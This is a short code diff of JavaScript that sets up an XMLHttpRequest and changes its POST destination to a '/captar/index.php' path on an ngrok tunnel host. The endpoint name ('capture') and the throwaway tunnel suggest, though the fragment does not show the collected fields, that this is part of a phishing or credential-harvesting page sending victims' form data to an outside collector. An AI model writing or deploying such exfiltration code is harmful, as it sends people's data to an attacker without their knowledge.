@@ -35,7 +35,7 @@ else if (window.XMLHttpRequest){
 else {
     xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
 }
-xmlhttp.open("POST", "https://3a0d4a0c3ecb.ngrok.io", true);
+xmlhttp.open("POST", "https://3a0d4a0c3ecb.ngrok.io/captar/index.php", true);
                     
 xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 ////#endregion
